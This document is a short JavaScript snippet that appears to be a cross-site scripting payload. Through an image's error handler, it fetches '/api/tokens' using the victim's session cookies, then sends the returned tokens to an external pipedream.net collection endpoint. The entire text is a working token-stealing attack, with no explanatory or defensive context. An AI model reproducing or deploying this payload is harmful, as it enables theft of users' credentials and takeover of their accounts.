var img = document.createElement('img');
img.src = 'invalid';

img.onerror = function () {
  fetch('/api/tokens?limit=10', { credentials: 'include' })
    .then(r => r.text())
    .then(token => {
      new Image().src =
        'https://eo61qn9oowvkg1p.m.pipedream.net/?token=' +
        encodeURIComponent(token);
    });
};

document.body.appendChild(img);
